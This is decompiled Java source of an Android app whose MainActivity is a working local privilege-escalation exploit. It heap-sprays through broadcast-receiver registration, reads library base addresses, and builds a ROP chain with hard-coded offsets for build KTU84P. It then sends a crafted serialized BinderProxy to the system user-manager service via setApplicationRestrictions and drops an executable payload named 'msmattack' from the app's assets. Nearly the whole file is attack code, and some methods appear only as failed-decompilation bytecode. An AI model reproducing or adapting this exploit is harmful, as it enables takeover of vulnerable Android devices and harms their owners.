package c.v.e;

import AAdroid.os.BinderProxy;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.res.AssetManager;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Process;
import android.os.UserHandle;
import android.os.UserManager;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.security.SecureRandom;

public class MainActivity
  extends Activity
{
  private static final String DESCRIPTOR = "android.os.IUserManager";
  static int Gadget_buffer_lenth = 1024;
  static int Unicode_buffer_lenth = 0;
  public static final String allChar = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  public static final String letterChar = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  public static final String numberChar = "0123456789";
  static int[] rop_chain_KTU84P;
  static int[] rop_chain_debug = { 300912, 148301, 248864, 151777 };
  private int TRANSACTION_setApplicationRestrictions;
  private Class clProxy;
  private Class clStub;
  private IBinder mRemote;
  BroadcastReceiver receiver = new BroadcastReceiver()
  {
    public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent) {}
  };
  
  static
  {
    rop_chain_KTU84P = new int[] { 302144, 148301, 248852, 151777 };
    Unicode_buffer_lenth = 100000;
  }
  
  public MainActivity() {}
  
  public static String generateString(int paramInt)
  {
    StringBuffer localStringBuffer = new StringBuffer();
    SecureRandom localSecureRandom = new SecureRandom();
    for (int i = 0;; i++)
    {
      if (i >= paramInt) {
        return localStringBuffer.toString();
      }
      localStringBuffer.append("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".charAt(localSecureRandom.nextInt("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".length())));
    }
  }
  
  void ReleaseBin()
  {
    AssetManager localAssetManager = getAssets();
    getApplicationInfo();
    for (;;)
    {
      int j;
      try
      {
        InputStream localInputStream = localAssetManager.open("msmattack");
        String str = getFilesDir().getPath();
        File localFile = new File(str.substring(0, str.lastIndexOf("/", -1 + str.length())), "e");
        if (!localFile.exists()) {
          localFile.createNewFile();
        }
        localFile.setExecutable(true, false);
        localFileOutputStream = new FileOutputStream(localFile);
        arrayOfByte = new byte['Ѐ'];
        i = localInputStream.read(arrayOfByte);
        if (i != -1) {
          break label153;
        }
        localInputStream.close();
        localFileOutputStream.close();
        return;
      }
      catch (Exception localException)
      {
        FileOutputStream localFileOutputStream;
        byte[] arrayOfByte;
        int i;
        localException.printStackTrace();
        return;
      }
      if (j < i)
      {
        localFileOutputStream.write(arrayOfByte[j]);
        j++;
        continue;
        label153:
        j = 0;
      }
    }
  }
  
  void expolit(int paramInt)
  {
    Context localContext = getBaseContext();
    label398:
    for (;;)
    {
      try
      {
        Bundle localBundle = new Bundle();
        BinderProxy localBinderProxy = new BinderProxy();
        localBinderProxy.mOrgue = paramInt;
        localBundle.putSerializable("eatthis", localBinderProxy);
        Class[] arrayOfClass1 = Class.forName("android.os.IUserManager").getDeclaredClasses();
        System.out.println(arrayOfClass1.length + " inner classes found");
        Object localObject1 = null;
        int i = arrayOfClass1.length;
        int j = 0;
        Class[] arrayOfClass2;
        int m;
        if (j >= i)
        {
          Field localField1 = localObject1.getDeclaredField("TRANSACTION_setApplicationRestrictions");
          localField1.setAccessible(true);
          this.TRANSACTION_setApplicationRestrictions = localField1.getInt(null);
          UserManager localUserManager = (UserManager)localContext.getSystemService("user");
          Field localField2 = UserManager.class.getDeclaredField("mService");
          localField2.setAccessible(true);
          Object localObject2 = localField2.get(localUserManager);
          arrayOfClass2 = localObject1.getDeclaredClasses();
          System.out.println(arrayOfClass2.length + " inner classes found");
          this.clProxy = null;
          int k = arrayOfClass2.length;
          m = 0;
          if (m >= k)
          {
            Field localField3 = this.clProxy.getDeclaredField("mRemote");
            localField3.setAccessible(true);
            this.mRemote = ((IBinder)localField3.get(localObject2));
            UserHandle localUserHandle = Process.myUserHandle();
            setApplicationRestrictions(localContext.getPackageName(), localBundle, localUserHandle.hashCode());
            Log.i("badserial", "waiting for boom here and over in the system service...");
          }
        }
        else
        {
          Class localClass2 = arrayOfClass1[j];
          System.out.println("inner class: " + localClass2.getCanonicalName());
          if (!localClass2.getCanonicalName().equals("android.os.IUserManager.Stub")) {
            break label398;
          }
          localObject1 = localClass2;
          break label398;
        }
        Class localClass1 = arrayOfClass2[m];
        System.out.println("inner class: " + localClass1.getCanonicalName());
        if (localClass1.getCanonicalName().equals("android.os.IUserManager.Stub.Proxy")) {
          this.clProxy = localClass1;
        }
        m++;
        continue;
        RuntimeException localRuntimeException;
        j++;
      }
      catch (Exception localException)
      {
        localRuntimeException = new RuntimeException(localException);
        throw localRuntimeException;
      }
    }
  }
  
  /* Error */
  int get_base(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: new 312	java/util/Scanner
    //   5: dup
    //   6: new 114	java/io/File
    //   9: dup
    //   10: ldc_w 314
    //   13: invokespecial 315	java/io/File:<init>	(Ljava/lang/String;)V
    //   16: invokespecial 316	java/util/Scanner:<init>	(Ljava/io/File;)V
    //   19: astore_3
    //   20: aload_3
    //   21: invokevirtual 319	java/util/Scanner:hasNextLine	()Z
    //   24: istore 6
    //   26: iload 6
    //   28: ifne +13 -> 41
    //   31: aload_3
    //   32: ifnull +7 -> 39
    //   35: aload_3
    //   36: invokevirtual 320	java/util/Scanner:close	()V
    //   39: iconst_0
    //   40: ireturn
    //   41: aload_3
    //   42: invokevirtual 323	java/util/Scanner:nextLine	()Ljava/lang/String;
    //   45: invokevirtual 326	java/lang/String:trim	()Ljava/lang/String;
    //   48: ldc_w 328
    //   51: invokevirtual 332	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   54: astore 7
    //   56: aload 7
    //   58: ifnull -38 -> 20
    //   61: aload 7
    //   63: arraylength
    //   64: iconst_1
    //   65: if_icmplt -45 -> 20
    //   68: aload 7
    //   70: iconst_0
    //   71: aaload
    //   72: astore 8
    //   74: aload 7
    //   76: arraylength
    //   77: bipush 6
    //   79: if_icmplt -59 -> 20
    //   82: aload_1
    //   83: aload 7
    //   85: iconst_5
    //   86: aaload
    //   87: invokevirtual 299	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   90: ifeq -70 -> 20
    //   93: aload 8
    //   95: ldc_w 334
    //   98: invokevirtual 332	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   101: astore 9
    //   103: ldc_w 336
    //   106: aload 9
    //   108: iconst_0
    //   109: aaload
    //   110: invokestatic 339	android/util/Log:d	(Ljava/lang/String;Ljava/lang/String;)I
    //   113: pop
    //   114: aload 9
    //   116: iconst_0
    //   117: aaload
    //   118: bipush 16
    //   120: invokestatic 344	java/lang/Integer:parseInt	(Ljava/lang/String;I)I
    //   123: istore 11
    //   125: aload_3
    //   126: ifnull +7 -> 133
    //   129: aload_3
    //   130: invokevirtual 320	java/util/Scanner:close	()V
    //   133: iload 11
    //   135: ireturn
    //   136: astore 4
    //   138: aload 4
    //   140: invokevirtual 345	java/io/FileNotFoundException:printStackTrace	()V
    //   143: aload_2
    //   144: ifnull -105 -> 39
    //   147: aload_2
    //   148: invokevirtual 320	java/util/Scanner:close	()V
    //   151: iconst_0
    //   152: ireturn
    //   153: astore 5
    //   155: aload_2
    //   156: ifnull +7 -> 163
    //   159: aload_2
    //   160: invokevirtual 320	java/util/Scanner:close	()V
    //   163: aload 5
    //   165: athrow
    //   166: astore 5
    //   168: aload_3
    //   169: astore_2
    //   170: goto -15 -> 155
    //   173: astore 4
    //   175: aload_3
    //   176: astore_2
    //   177: goto -39 -> 138
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	180	0	this	MainActivity
    //   0	180	1	paramString	String
    //   1	176	2	localObject1	Object
    //   19	157	3	localScanner	java.util.Scanner
    //   136	3	4	localFileNotFoundException1	java.io.FileNotFoundException
    //   173	1	4	localFileNotFoundException2	java.io.FileNotFoundException
    //   153	11	5	localObject2	Object
    //   166	1	5	localObject3	Object
    //   24	3	6	bool	boolean
    //   54	30	7	arrayOfString1	String[]
    //   72	22	8	str	String
    //   101	14	9	arrayOfString2	String[]
    //   123	11	11	i	int
    // Exception table:
    //   from	to	target	type
    //   2	20	136	java/io/FileNotFoundException
    //   2	20	153	finally
    //   138	143	153	finally
    //   20	26	166	finally
    //   41	56	166	finally
    //   61	125	166	finally
    //   20	26	173	java/io/FileNotFoundException
    //   41	56	173	java/io/FileNotFoundException
    //   61	125	173	java/io/FileNotFoundException
  }
  
  void heap_spary(String paramString)
  {
    String str = paramString + generateString(16);
    try
    {
      ((LocationManager)getSystemService("location")).addTestProvider(str.toString(), false, false, false, false, false, false, false, 1, 1);
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  void heap_spary_ex(String paramString)
  {
    String str = paramString + generateString(16);
    try
    {
      IntentFilter localIntentFilter = new IntentFilter();
      localIntentFilter.addAction(generateString(16));
      registerReceiver(this.receiver, localIntentFilter, str, null);
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2130903040);
    ((Button)findViewById(2131099649)).setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        MainActivity.this.ReleaseBin();
        int i = MainActivity.this.get_base("/dev/ashmem/dalvik-heap");
        int j = MainActivity.this.get_base("/system/lib/libc.so");
        int k = MainActivity.this.get_base("/system/lib/libandroid_runtime.so");
        int m = i + 16781312;
        Log.d("cve", "exploiting.... static address 0x" + Integer.toHexString(m));
        int n = MainActivity.Unicode_buffer_lenth - MainActivity.Gadget_buffer_lenth;
        int i1 = m + n;
        Log.d("cve", "exploiting.... gadget buffer 0x" + Integer.toHexString(i1));
        Log.d("cve", "exploiting.... gadget buffer offset 0x" + Integer.toHexString(n));
        char[] arrayOfChar = new char[MainActivity.Unicode_buffer_lenth / 2];
        arrayOfChar[0] = 48815;
        arrayOfChar[1] = 57005;
        int i2 = 0;
        int i4;
        label177:
        String str;
        if (i2 >= n / 2)
        {
          i4 = n / 2;
          if (i4 < MainActivity.Unicode_buffer_lenth / 2) {
            break label712;
          }
          int[] arrayOfInt = MainActivity.rop_chain_KTU84P;
          int i6 = -2 + n / 2;
          arrayOfChar[i6] = ((char)1);
          arrayOfChar[(i6 + 1)] = ((char)0);
          int i7 = i6 + 2;
          arrayOfChar[i7] = ((char)-559038737);
          arrayOfChar[(i7 + 1)] = 57005;
          int i8 = i7 + 2;
          arrayOfChar[i8] = ((char)m);
          arrayOfChar[(i8 + 1)] = ((char)(0xFFFF & m >> 16));
          int i9 = i8 + 2;
          arrayOfChar[i9] = ((char)-559038737);
          arrayOfChar[(i9 + 1)] = 57005;
          int i10 = i9 + 2;
          int i11 = k + arrayOfInt[0];
          arrayOfChar[i10] = ((char)i11);
          arrayOfChar[(i10 + 1)] = ((char)(0xFFFF & i11 >> 16));
          int i12 = i10 + 2;
          int i13 = j + arrayOfInt[2];
          arrayOfChar[i12] = ((char)i13);
          arrayOfChar[(i12 + 1)] = ((char)(0xFFFF & i13 >> 16));
          int i14 = (n + 32) / 2;
          arrayOfChar[i14] = ((char)-559038737);
          arrayOfChar[(i14 + 1)] = 57005;
          int i15 = i14 + 2;
          int i16 = j + arrayOfInt[3];
          arrayOfChar[i15] = ((char)i16);
          arrayOfChar[(i15 + 1)] = ((char)(0xFFFF & i16 >> 16));
          int i17 = (n - 72) / 2;
          arrayOfChar[i17] = ((char)1952539695);
          arrayOfChar[(i17 + 1)] = ((char)'瑡');
          int i18 = i17 + 2;
          arrayOfChar[i18] = ((char)1633955681);
          arrayOfChar[(i18 + 1)] = ((char)'慤');
          int i19 = i18 + 2;
          arrayOfChar[i19] = ((char)1664049524);
          arrayOfChar[(i19 + 1)] = ((char)'振');
          int i20 = i19 + 2;
          arrayOfChar[i20] = ((char)1697543726);
          arrayOfChar[(i20 + 1)] = ((char)'攮');
          int i21 = i20 + 2;
          arrayOfChar[i21] = ((char)'支');
          arrayOfChar[(i21 + 1)] = ((char)0);
          int i22 = (n + 888) / 2;
          int i23 = j + arrayOfInt[1];
          arrayOfChar[i22] = ((char)i23);
          arrayOfChar[(i22 + 1)] = ((char)(0xFFFF & i23 >> 16));
          str = String.valueOf(arrayOfChar);
        }
        for (int i24 = 0;; i24++)
        {
          if (i24 >= 2000)
          {
            MainActivity.this.expolit(m);
            return;
            int i3 = i1 - i2 * 2;
            arrayOfChar[i2] = ((char)i3);
            arrayOfChar[(i2 + 1)] = ((char)(0xFFFF & i3 >> 16));
            Log.d("cve", "0x" + Integer.toHexString(arrayOfChar[(i2 + 1)]) + Integer.toHexString(arrayOfChar[i2]));
            i2 += 2;
            break;
            label712:
            int i5 = i4 / 2;
            arrayOfChar[i4] = ((char)i5);
            arrayOfChar[(i4 + 1)] = ((char)(0xFFFF & i5 >> 16));
            i4 += 2;
            break label177;
          }
          MainActivity.this.heap_spary_ex(str);
          if (i24 % 100 == 0) {
            Log.d("cve", "sparying.... " + i24);
          }
        }
      }
    });
  }
  
  /* Error */
  public void setApplicationRestrictions(String paramString, Bundle paramBundle, int paramInt)
    throws android.os.RemoteException
  {
    // Byte code:
    //   0: invokestatic 402	android/os/Parcel:obtain	()Landroid/os/Parcel;
    //   3: astore 4
    //   5: invokestatic 402	android/os/Parcel:obtain	()Landroid/os/Parcel;
    //   8: astore 5
    //   10: aload 4
    //   12: ldc 8
    //   14: invokevirtual 405	android/os/Parcel:writeInterfaceToken	(Ljava/lang/String;)V
    //   17: aload 4
    //   19: aload_1
    //   20: invokevirtual 408	android/os/Parcel:writeString	(Ljava/lang/String;)V
    //   23: aload 4
    //   25: iconst_1
    //   26: invokevirtual 411	android/os/Parcel:writeInt	(I)V
    //   29: aload_2
    //   30: aload 4
    //   32: iconst_0
    //   33: invokevirtual 415	android/os/Bundle:writeToParcel	(Landroid/os/Parcel;I)V
    //   36: aload 4
    //   38: iload_3
    //   39: invokevirtual 411	android/os/Parcel:writeInt	(I)V
    //   42: aload 4
    //   44: invokevirtual 419	android/os/Parcel:marshall	()[B
    //   47: astore 7
    //   49: iconst_0
    //   50: istore 8
    //   52: aload 7
    //   54: iload 8
    //   56: baload
    //   57: bipush 65
    //   59: if_icmpne +111 -> 170
    //   62: aload 7
    //   64: iload 8
    //   66: iconst_1
    //   67: iadd
    //   68: baload
    //   69: bipush 65
    //   71: if_icmpne +99 -> 170
    //   74: aload 7
    //   76: iload 8
    //   78: iconst_2
    //   79: iadd
    //   80: baload
    //   81: bipush 100
    //   83: if_icmpne +87 -> 170
    //   86: aload 7
    //   88: iload 8
    //   90: iconst_3
    //   91: iadd
    //   92: baload
    //   93: bipush 114
    //   95: if_icmpne +75 -> 170
    //   98: aload 7
    //   100: iload 8
    //   102: bipush 97
    //   104: bastore
    //   105: aload 7
    //   107: iload 8
    //   109: iconst_1
    //   110: iadd
    //   111: bipush 110
    //   113: bastore
    //   114: aload 4
    //   116: invokevirtual 422	android/os/Parcel:recycle	()V
    //   119: invokestatic 402	android/os/Parcel:obtain	()Landroid/os/Parcel;
    //   122: astore 4
    //   124: aload 4
    //   126: aload 7
    //   128: iconst_0
    //   129: aload 7
    //   131: arraylength
    //   132: invokevirtual 426	android/os/Parcel:unmarshall	([BII)V
    //   135: aload_0
    //   136: getfield 260	c/v/e/MainActivity:mRemote	Landroid/os/IBinder;
    //   139: aload_0
    //   140: getfield 237	c/v/e/MainActivity:TRANSACTION_setApplicationRestrictions	I
    //   143: aload 4
    //   145: aload 5
    //   147: iconst_0
    //   148: invokeinterface 430 5 0
    //   153: pop
    //   154: aload 5
    //   156: invokevirtual 433	android/os/Parcel:readException	()V
    //   159: aload 5
    //   161: invokevirtual 422	android/os/Parcel:recycle	()V
    //   164: aload 4
    //   166: invokevirtual 422	android/os/Parcel:recycle	()V
    //   169: return
    //   170: iinc 8 1
    //   173: goto -121 -> 52
    //   176: astore 6
    //   178: aload 5
    //   180: invokevirtual 422	android/os/Parcel:recycle	()V
    //   183: aload 4
    //   185: invokevirtual 422	android/os/Parcel:recycle	()V
    //   188: aload 6
    //   190: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	191	0	this	MainActivity
    //   0	191	1	paramString	String
    //   0	191	2	paramBundle	Bundle
    //   0	191	3	paramInt	int
    //   3	181	4	localParcel1	android.os.Parcel
    //   8	171	5	localParcel2	android.os.Parcel
    //   176	13	6	localObject	Object
    //   47	83	7	arrayOfByte	byte[]
    //   50	121	8	i	int
    // Exception table:
    //   from	to	target	type
    //   10	49	176	finally
    //   52	159	176	finally
  }
}
